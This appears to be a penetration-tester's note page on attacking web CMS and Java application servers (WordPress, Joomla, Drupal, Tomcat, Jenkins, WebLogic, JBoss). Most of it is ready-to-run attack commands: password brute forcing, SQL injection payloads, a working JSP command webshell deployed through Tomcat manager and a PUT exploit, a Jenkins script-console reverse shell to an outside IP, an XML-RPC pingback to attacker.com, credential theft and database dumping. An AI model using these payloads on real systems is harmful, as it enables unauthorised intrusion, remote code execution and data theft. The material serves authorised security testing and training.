# CMS Hacking Complete

## Overview

Content Management Systems (CMS) power a significant portion of the web. Each major CMS has its own architecture, vulnerabilities, and testing methodology. This guide covers the most common CMS platforms encountered during assessments.

**General CMS Testing Approach:**
1. Identify the CMS (banner, page source, paths, Wappalyzer)
2. Identify version
3. Search for known vulnerabilities by version
4. Check default/admin paths
5. Test authentication and authorization
6. Check for vulnerable plugins/themes

---

## WordPress

WordPress powers ~40% of all websites, making it the most common CMS on the internet.

### Detection

```bash
# Check page source for WordPress indicators
curl -s http://target.com/ | grep -i "wp-content\|wp-includes\|wordpress\|generator"

# Common WordPress paths
curl -I http://target.com/wp-admin/
curl -I http://target.com/wp-login.php
curl -I http://target.com/xmlrpc.php
curl -I http://target.com/wp-json/

# Check /license.txt for version
curl http://target.com/license.txt

# Check /readme.html for version (older installs)
curl http://target.com/readme.html

# JSON endpoint (user enumeration)
curl http://target.com/wp-json/wp/v2/users/
```

### WPScan

WPScan is the primary tool for WordPress security testing.

```bash
# Basic scan
wpscan --url http://target.com

# Enumerate vulnerable plugins
wpscan --url http://target.com --enumerate vp

# Enumerate vulnerable themes
wpscan --url http://target.com --enumerate vt

# Enumerate all users
wpscan --url http://target.com --enumerate u

# Enumerate everything
wpscan --url http://target.com --enumerate vp,vt,u

# Brute force login
wpscan --url http://target.com --passwords /usr/share/wordlists/rockyou.txt --usernames admin

# Brute force with username enumeration
wpscan --url http://target.com --passwords /usr/share/wordlists/rockyou.txt --usernames users.txt

# API token for more accurate results
wpscan --url http://target.com --api-token <YOUR_TOKEN>

# Output formats
wpscan --url http://target.com --enumerate vp -o wpscan_output.txt
wpscan --url http://target.com --format json -o wpscan_output.json

# With HTTP authentication
wpscan --url http://target.com --http-auth admin:password

# Ignore SSL warnings
wpscan --url https://target.com --ignore-main-redirect --disable-tls-checks
```

### XML-RPC Abuse

xmlrpc.php is often enabled by default and provides an API for various operations.

```bash
# Check if xmlrpc is enabled
curl -X POST http://target.com/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'

# User enumeration via system.getUsers
curl http://target.com/xmlrpc.php -X POST -d '<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>password</value></param></params></methodCall>'

# Brute force via xmlrpc (more efficient than wp-login)
# xmlrpc allows batching multiple auth attempts in a single request

# Batch brute force (faster, fewer requests)
curl http://target.com/xmlrpc.php -X POST -d '<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param>
      <value>
        <array>
          <data>
            <value>
              <struct>
                <member>
                  <name>methodName</name>
                  <value><string>wp.getUsersBlogs</string></value>
                </member>
                <member>
                  <name>params</name>
                  <value>
                    <array>
                      <data>
                        <value><string>admin</string></value>
                        <value><string>password1</string></value>
                      </data>
                    </array>
                  </value>
                </member>
              </struct>
            </value>
          </data>
        </array>
      </value>
    </param>
  </params>
</methodCall>'

# XMLRPC DoS (if no rate limiting on multicall)
# Pingback abuse (SSRF)
curl http://target.com/xmlrpc.php -X POST -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value>http://attacker.com/webhook</value></param><param><value>http://target.com/validpost</value></param></params></methodCall>'

# Disable xmlrpc (recommended):
# Add to .htaccess: RewriteRule ^xmlrpc.php$ - [F,L]
# Or via plugins: "Disable XML-RPC"
```

### Theme and Plugin Vulnerabilities

```bash
# Enumerate plugins via wpscan
wpscan --url http://target.com --enumerate ap,at --plugins-detection aggressive

# Check plugin version from readme
curl http://target.com/wp-content/plugins/<plugin-name>/readme.txt

# Common vulnerable plugins (historical)
# WooCommerce (various)
# Contact Form 7 (file upload RCE)
# Elementor (various)
# Yoast SEO (various)
# Gravity Forms (various)
# RevSlider (file upload RCE)
# TimThumb (RFI/RCE)
# WP GDPR Compliance (XSS)
# BackupBuddy (SQLi)
# File Manager (RCE)
# Social Warfare (XSS)

# Plugin directory listing (if enabled)
curl http://target.com/wp-content/plugins/<plugin-name>/

# Checking for plugin activation
curl -s http://target.com/wp-content/plugins/<plugin-name>/<plugin-file>.php | head -20
```

### wp-config.php Access

```bash
# Direct access attempt
curl http://target.com/wp-config.php
# Generally returns blank/inaccessible, but sometimes misconfigured

# Check for backups
curl http://target.com/wp-config.bak
curl http://target.com/wp-config.php.bak
curl http://target.com/wp-config.php~     # vim backup
curl http://target.com/wp-config.php.old
curl http://target.com/wp-config.php.swp  # vim swap
curl http://target.com/wp-config.php.save
curl http://target.com/wp-config.txt
curl http://target.com/wp-config.inc
curl http://target.com/wp-config.php.dist

# Git exposure
curl http://target.com/.git/config

# If wp-config.php is readable, extract:
# DB_NAME, DB_USER, DB_PASSWORD, DB_HOST
# AUTH_KEY, SECURE_AUTH_KEY, LOGGED_IN_KEY, NONCE_KEY
# AUTH_SALT, SECURE_AUTH_SALT
```

### Critical WordPress Files

| File/Path | Purpose |
|-----------|---------|
| /wp-admin/ | Admin dashboard |
| /wp-login.php | Login page |
| /wp-content/ | Uploads, themes, plugins |
| /wp-includes/ | Core WordPress files |
| /xmlrpc.php | XML-RPC API |
| /wp-json/ | REST API |
| /wp-config.php | Database and security keys |
| /.htaccess | Server config (accessible if mod_rewrite) |
| /wp-content/debug.log | WP_DEBUG log |
| /wp-content/themes/ | All themes |
| /wp-content/plugins/ | All plugins |
| /wp-content/uploads/ | File uploads (user-generated) |
| /sitemap.xml | Sitemap (may reveal pages) |

### WordPress User Enumeration

```bash
# Via REST API
curl http://target.com/wp-json/wp/v2/users/
curl http://target.com/wp-json/wp/v2/users?per_page=100

# Via author archives
curl -s http://target.com/?author=1 | grep -oP 'Author:(.*?)<' | head -1
for i in $(seq 1 10); do
  curl -s "http://target.com/?author=$i" -L | grep -i "author" | head -1
  echo "Author ID: $i"
done

# Via login page errors
# "Invalid username" vs "Password incorrect"

# Via comment author names
curl http://target.com/ | grep -oP 'class="url"[^>]*>\K[^<]+'
```

### WordPress Privilege Escalation

```bash
# New user registration (if enabled)
# Default: Disabled, but plugins may enable

# Administrator user creation (if file write access)
# Via compromised plugin author or admin account

# Upload shell via media library (if contributor+ rights)
# Plugin editor (wp-admin/plugin-editor.php) — if admin access

# Theme editor (wp-admin/theme-editor.php)
# Edit 404.php or other theme file to add webshell

# SQL injection to admin account creation
UPDATE wp_users SET user_pass = MD5('newpass') WHERE user_login = 'admin';
UPDATE wp_usermeta SET meta_value = 'administrator' WHERE user_id = 1 AND meta_key = 'wp_capabilities';
```

---

## Joomla

Joomla is the second most common CMS.

### Detection

```bash
# Check for Joomla indicators
curl -s http://target.com/ | grep -i "joomla\|com_content\|com_user"
curl -I http://target.com/ | grep -i "joomla"

# Check /administrator/
curl -I http://target.com/administrator/

# Check /language/en-GB/en-GB.xml for version
curl -s http://target.com/language/en-GB/en-GB.xml | grep -oP '<version>\K[^<]+'

# Check README.txt
curl http://target.com/README.txt
```

### Joomscan

```bash
# Basic scan
joomscan -u http://target.com

# Scan with enumeration
joomscan -u http://target.com -ec

# Output to file
joomscan -u http://target.com -o joomscan_report.html

# Scan with cookie
joomscan -u http://target.com -c "cookie=value"
```

### Joomla Vulnerable Extensions

**com_jce (JCE Editor)**

```bash
# JCE <= 2.5.7: File upload RCE
# Path: /components/com_jce/editor/tiny_mce/plugins/...

# JCE <= 2.6.4: Arbitrary file upload
# Exploit: Upload PHP shell through the editor plugin

# Testing
curl http://target.com/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=uploadmanager&view=image
```

**com_fields**

```bash
# Joomla 3.7.0 - SQLi in com_fields
# https://www.exploit-db.com/exploits/42033

# Testing
curl http://target.com/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x3e,user()),0)
```

### Joomla Common Paths

| Path | Purpose |
|------|---------|
| /administrator/ | Admin panel |
| /index.php?option=com_config | Configuration |
| /index.php?option=com_users | User management |
| /components/ | Extension directory |
| /modules/ | Module directory |
| /templates/ | Template directory |
| /logs/ | Log files (may leak info) |
| /tmp/ | Temporary files |
| /configuration.php | Database config (core) |
| /htaccess.txt | HTACCESS sample |
| /robots.txt | Directory structure hints |
| /language/en-GB/en-GB.xml | Version info |

### Joomla SQLi Testing

```bash
# Known SQLi vectors (historical)
# com_content, com_fields, com_users, com_search

# Generic test
curl "http://target.com/index.php?option=com_content&view=article&id=1 UNION SELECT 1,2,3,database(),5,6,7,8,9,10--"

# User enumeration from DB
curl "http://target.com/index.php?option=com_users&view=users&id=1"
```

### Joomla 2FA Bypass

```bash
# If 2FA is implemented via plugin
# Try direct access to /administrator/index.php bypassing 2FA check
# Check for backup codes
# Test session manipulation after 1FA
```

---

## Drupal

Drupal is popular for enterprise and government sites.

### Detection

```bash
# Check for Drupal indicators
curl -s http://target.com/ | grep -i "drupal\|sites/default\|drupal.js"
curl -I http://target.com/ | grep -i "Drupal"
curl http://target.com/CHANGELOG.txt | head -20
curl http://target.com/core/CHANGELOG.txt | head -20

# Check /node for content
curl -I http://target.com/node/1

# Check /user/login
curl -I http://target.com/user/login
```

### Droopescan

```bash
# Basic scan
droopescan scan drupal -u http://target.com

# Aggressive scan
droopescan scan drupal -u http://target.com --aggressive

# Output to file
droopescan scan drupal -u http://target.com -o drupal_scan.txt

# Scan multiple targets
droopescan scan drupal -u http://target.com --override
```

### Drupalgeddon2 (CVE-2018-7600)

This is the most critical Drupal vulnerability — RCE via the Form API.

```bash
# Check vulnerability
curl -k "http://target.com/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" | grep "mail"

# Exploit with drupalgeddon2 script
# https://github.com/dreadlocked/Drupalgeddon2
python3 drupalgeddon2.py -t http://target.com -c "id"

# Drupal <= 7.58, Drupal <= 8.5.1, Drupal <= 8.4.6
# Patched in Drupal 7.59, 8.5.2, 8.4.7

# Commands to run
python3 drupalgeddon2.py -t http://target.com -c "whoami"
python3 drupalgeddon2.py -t http://target.com -c "uname -a"
python3 drupalgeddon2.py -t http://target.com -c "cat /etc/passwd"
```

### Common Drupal Paths

| Path | Purpose |
|------|---------|
| /user/login | Login page |
| /user/register | Registration |
| /admin | Admin dashboard |
| /node/add | Content creation |
| /sites/default/ | Default settings and files |
| /sites/default/files/ | Uploaded files |
| /sites/default/settings.php | Database credentials |
| /sites/default/services.yml | Service configuration |
| /modules/ | Module directory |
| /themes/ | Theme directory |
| /includes/ | Core includes |
| /misc/ | Miscellaneous (JS, etc.) |
| /core/ | Drupal 8+ core files |
| /CHANGELOG.txt | Version info |
| /INSTALL.txt | Install info |
| /install.php | Installation script |

### Drupal User Enumeration

```bash
# Via user page
curl http://target.com/user/1
curl http://target.com/user/2

# Different responses for existing vs. non-existing users
# Drupal 7: "Access denied" vs. "Page not found"
# Drupal 8: "Access denied" for both (if configured)
```

### Drupal Module Vulnerabilities

```bash
# Common vulnerable modules
# - CKEditor (various XSS/file upload)
# - PHP Filter (RCE if enabled)
# - Views (SQLi, access bypass)
# - Webform (various)
# - Panels (access bypass)
# - Services (access bypass, RCE)
# - RESTful Web Services (Drupal 8 config issue)
# - FileField (file upload RCE)

# Check enabled modules from page source
# View page source: look for module-specific CSS/JS
# /modules/<module_name>/ paths
```

---

## Tomcat

Apache Tomcat is a Java servlet container, commonly deployed as a web server or embedded in applications.

### Detection

```bash
# Default port: 8080
curl -I http://target.com:8080
curl -I http://target.com:8080/manager/html

# Check for Tomcat in headers
curl -v http://target.com:8080 2>&1 | grep -i "tomcat\|Apache-Coyote"

# Default error pages
curl http://target.com:8080/nonexistent
```

### Manager Application

```bash
# /manager/html — web-based admin interface
# /manager/status — server status
# /manager/ — manager redirect

# Default credentials to try
# admin:admin
# tomcat:tomcat
# role1:role1
# admin:password
# tomcat:password
# admin: (blank)
# admin:s3cret
# admin:tomcat

# Brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://target.com:8080/manager/html

# Deploy WAR file via manager (if authenticated)
# This gives you a webshell

# 1. Create malicious WAR
mkdir webshell/
echo '<%@ page import="java.io.*" %><% Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream())); String line; while ((line = in.readLine()) != null) { out.println(line); } %>' > webshell/cmd.jsp
cd webshell && jar -cvf ../webshell.war . && cd ..

# 2. Deploy via manager (needs auth)
curl -u admin:password --upload-file webshell.war "http://target.com:8080/manager/html/upload?path=/webshell"

# 3. Access webshell
curl "http://target.com:8080/webshell/cmd.jsp?cmd=id"
```

### CVE-2017-12617 (PUT Method RCE)

Tomcat 9.0.0.M1 to 9.0.0, 8.5.0 to 8.5.22, 8.0.0.RC1 to 8.0.46, and 7.0.0 to 7.0.81.

```bash
# Check if PUT is enabled
curl -v -X OPTIONS http://target.com:8080/ 2>&1 | grep "PUT\|Allow"

# Upload JSP shell
curl -X PUT http://target.com:8080/shell.jsp --data '<%@ page import="java.io.*" %><% Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream())); String line; while ((line = in.readLine()) != null) { out.println(line); } %>'

# Access shell
curl http://target.com:8080/shell.jsp?cmd=id
```

### Other Tomcat Paths

| Path | Description |
|------|-------------|
| /examples/ | Sample applications (may expose vulns) |
| /examples/jsp/snp/snoop.jsp | Request info disclosure |
| /WEB-INF/web.xml | Web app configuration |
| /WEB-INF/applicationContext.xml | Spring config |

### Tomcat Reverse Engineering

```bash
# Check server.xml for credentials
# Located in /conf/server.xml
# Look for passwords in UserDatabase realm

# Check tomcat-users.xml
# Located in /conf/tomcat-users.xml
# /etc/tomcat/tomcat-users.xml or similar
```

---

## Jenkins

Jenkins is an automation server used for CI/CD, often found with security issues.

### Detection

```bash
# Default port: 8080
curl -I http://target.com:8080/

# Jenkins indicators
curl -s http://target.com:8080/ | grep -i "jenkins\|hudson"

# /api/json endpoint (information disclosure)
curl http://target.com:8080/api/json
```

### /script Access (Script Console)

Jenkins has a Groovy script console that allows arbitrary code execution.

```bash
# Check if script console is accessible without auth
curl -s http://target.com:8080/script

# If accessible, execute Groovy commands
curl -X POST http://target.com:8080/script \
  -d "script=println 'whoami'.execute().text"

# Execute system commands
curl -X POST http://target.com:8080/script \
  -d "script=def proc = 'id'.execute(); proc.waitFor(); println proc.in.text"

# Reverse shell via script console
curl -X POST http://target.com:8080/script \
  -d "script=['bash','-c','bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'].execute()"
```

### /api/json Information Disclosure

```bash
# List all jobs
curl http://target.com:8080/api/json

# List builds
curl http://target.com:8080/job/<job-name>/api/json

# Get build details (may contain env vars with secrets)
curl http://target.com:8080/job/<job-name>/<build-number>/api/json

# Get build environment variables
curl http://target.com:8080/job/<job-name>/<build-number>/injectedEnvVars/api/json

# Get build console output (may contain credentials)
curl http://target.com:8080/job/<job-name>/<build-number>/consoleText
```

### Jenkins Common Paths

| Path | Description |
|------|-------------|
| /script | Groovy script console |
| /api/json | API info endpoint |
| /job/ | Job listing |
| /configure | Global configuration |
| /manage | Manage Jenkins |
| /credentials/ | Credential storage |
| /user/ | User management |
| /systemInfo | System information |
| /asynchPeople/ | User list (access via sidebar) |
| /whoAmI/ | Current user info |

### Jenkins Credential Theft

```bash
# If admin access:
# /credentials/ -> view stored credentials

# Decrypt credentials (if you have access to master.key and hudson.util.Secret)
# Located in $JENKINS_HOME/

# Access secrets
curl -u admin:password http://target.com:8080/credentials/store/system/domain/_/api/json

# Clear text credentials (in older Jenkins)
curl -u admin:password "http://target.com:8080/job/<job>/<build>/console"
```

### Jenkins Weak Authentication

```bash
# Default: no authentication (anyone can configure)
# Common: user self-registration enabled

# Brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post://target.com:8080/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&Submit=Sign+in

# Check for "Remember me" cookie manipulation
```

---

## GlassFish

GlassFish is a Java EE application server.

### Detection

```bash
# Default port: 4848 (admin), 8080 (HTTP)
curl -I http://target.com:4848/
curl -I http://target.com:8080/

# Default credentials
# admin:adminadmin
# admin: (blank)
# admin:password

# Check
curl http://target.com:4848/
```

### GlassFish Common Paths

| Path | Description |
|------|-------------|
| / | Admin console |
| /common/index.jsf | Admin login |
| /resource/ | Resource listing |
| /applications/ | Deployed applications |

### GlassFish Exploitation

```bash
# Default credential access
# admin:adminadmin
# Once logged in:
# - Deploy malicious WAR
# - Access application server configuration
# - Read database connection pools
# - JNDI lookups

# Deploy WAR (authenticated)
curl -u admin:adminadmin \
  -F "type=application/octet-stream" \
  -F "file=@webshell.war" \
  "http://target.com:4848/__datastore/upload"
```

---

## WebLogic

Oracle WebLogic Server is a Java EE application server.

### Detection

```bash
# Default port: 7001
curl -I http://target.com:7001/console/

# WebLogic indicators
curl -v http://target.com:7001/ 2>&1 | grep -i "weblogic"
```

### WebLogic Common Paths

| Path | Description |
|------|-------------|
| /console/ | Admin console |
| /console/images/ | Resource path |
| /wls-wsat/ | Web Services (CVE-2017-10271) |
| /_async/ | Asynchronous servlet (CVE-2019-2725) |
| /uddiexplorer/ | UDDI browser (SSRF - CVE-2014-4210) |
| /bea_wls_internal/ | Internal tools |
| /jms/ | Java Message Service |

### WebLogic Critical CVEs

```bash
# CVE-2017-10271 (XMLDecoder RCE)
curl -X POST http://target.com:7001/wls-wsat/CoordinatorPortType \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><soapenv:Envelope>...<work:WorkContext><java><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="1"><void index="0"><string>whoami</string></void></array><void method="start"/></object></java></work:WorkContext></soapenv:Envelope>'

# CVE-2019-2725 (Async servlet RCE)
curl -X POST http://target.com:7001/_async/AsyncResponseService \
  -H "Content-Type: text/xml" \
  -d '<soapenv:Envelope>...'

# CVE-2014-4210 (SSRF)
# UDDI explorer SSRF to internal network
curl "http://target.com:7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://internal-target:port&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search"

# CVE-2020-14882 (Console auth bypass)
curl http://target.com:7001/console/css/%252e%252e%252fconsole.portal
```

### WebLogic Default Credentials

```bash
# weblogic:weblogic
# weblogic:password
# system:system
# administrator:administrator
# system:password
```

---

## JBoss (WildFly)

JBoss / WildFly is a Java application server.

### Detection

```bash
# Default port: 8080 (HTTP), 9990 (Admin)
curl -I http://target.com:8080/
curl -I http://target.com:9990/

# JMX Console (historical)
curl http://target.com:8080/jmx-console/
curl http://target.com:8080/web-console/
curl http://target.com:8080/admin-console/
curl http://target.com:8080/management/
```

### JBoss Exploitation

```bash
# JMX Console Deploy (historical but common)
# Access /jmx-console/ -> find jboss.system:service=MainDeployer
# Deploy WAR via createURLDeployment

# Direct deployment via HTTP
curl -v http://target.com:8080/invoker/JMXInvokerServlet

# EJBInvokerServlet
# CVE-2007-1036

# Administration Console
# Default: admin:admin
```

### JMX Console Exploit (Example)

```bash
# 1. Create a JSP shell inside a WAR
# 2. Upload the WAR via JMX invoke
# 3. Access /shell/shell.jsp

# Using jexboss (automated)
python3 jexboss.py -u http://target.com:8080

# If deployment succeeds, the WAR is accessible at:
curl http://target.com:8080/shell/shell.jsp?cmd=id
```

---

## CMS Quick Reference

### Common Default Paths (All CMS)

| CMS | Admin Path | Login Path | Config File |
|-----|-----------|------------|-------------|
| WordPress | /wp-admin/ | /wp-login.php | wp-config.php |
| Joomla | /administrator/ | /administrator/index.php | configuration.php |
| Drupal | /admin | /user/login | sites/default/settings.php |
| Tomcat | /manager/html | /manager/html | conf/tomcat-users.xml |
| Jenkins | / | /login | /var/lib/jenkins/config.xml |
| GlassFish | / (port 4848) | /common/index.jsf | config/domain.xml |
| WebLogic | /console/ | /console/login/LoginForm.jsp | config.xml |
| JBoss | /admin-console/ | /admin-console/ | server/default/conf/ |

### CMS Version Detection Quick Reference

```bash
# WordPress
curl http://target.com/readme.html
curl http://target.com/license.txt

# Joomla
curl http://target.com/language/en-GB/en-GB.xml

# Drupal
curl http://target.com/CHANGELOG.txt
curl http://target.com/core/CHANGELOG.txt

# Tomcat
curl http://target.com:8080/ | grep "Apache Tomcat"
curl http://target.com:8080/docs/ | grep "Version"

# Jenkins
curl http://target.com:8080/api/json | jq '.version'
curl http://target.com:8080/ | grep -oP "Jenkins ver\. \K[^<]+"

# WebLogic
curl http://target.com:7001/console/ | grep "WebLogic Server Version"
```

### CMS Scanner Comparison

| Tool | Best For |
|------|----------|
| [[#WPScan]] | WordPress scanning |
| [[#Joomscan]] | Joomla specific scans |
| [[#Droopescan]] | Drupal specific scans |
| [[02 - Vulnerability Assessment/Vulnerability Assessment Notes#Searchsploit\|Searchsploit]] | Finding exploits by CMS + version |
| [[03 - Web Application Hacking/3.1 Information Gathering/Web Reconnaissance]] | General web recon |

---

## General CMS Post-Exploitation

Once you have CMS admin access:

### Database Access

```bash
# Extract CMS database credentials from config files
# WordPress: wp-config.php
# Joomla: configuration.php
# Drupal: sites/default/settings.php

# If MySQL is accessible
mysql -h db_host -u db_user -p db_name -e "SELECT user_login, user_pass FROM wp_users;"
mysql -h localhost -u root wp_db -e "UPDATE wp_users SET user_pass = MD5('newpass123') WHERE user_login = 'admin';"
```

### File Upload as Persistence

```bash
# Upload a webshell as a theme/plugin file
# WordPress: Appearance > Theme Editor > Edit 404.php
# Joomla: Extensions > Templates > Edit index.php
# Drupal: Appearance > Settings > Edit theme file

# Or via file upload feature
# WordPress: /wp-admin/media-new.php
# Joomla: /administrator/index.php?option=com_media
# Drupal: /admin/content/media/add
```

### Extracting Site Data

```bash
# Database dump
mysqldump -h db_host -u db_user -p db_name > site_database.sql

# File archive
tar -czf site_files.tar.gz /var/www/html/

# User hashes (password cracking)
# WordPress: wp_users table (MD5)
# Joomla: jos_users table (bcrypt, MD5)
# Drupal: users table (SHA-512, MD5 in older versions)
```

---

## Related Notes

- [[03 - Web Application Hacking/3.1 Information Gathering/Web Reconnaissance]] — identifying CMS during recon
- [[03 - Web Application Hacking/3.8 Authentication Bypass/Authentication Bypass Complete]] — bypassing CMS auth
- [[03 - Web Application Hacking/3.9 API Testing/API Testing Complete]] — CMS API testing
- [[03 - Web Application Hacking/3.11 Common Vulnerabilities/Common Web Vulns]] — common web vulnerabilities
- [[02 - Vulnerability Assessment/Vulnerability Assessment Notes]] — general vulnerability assessment
- [[13 - Report Writing/Penetration Test Report Template]] — reporting findings
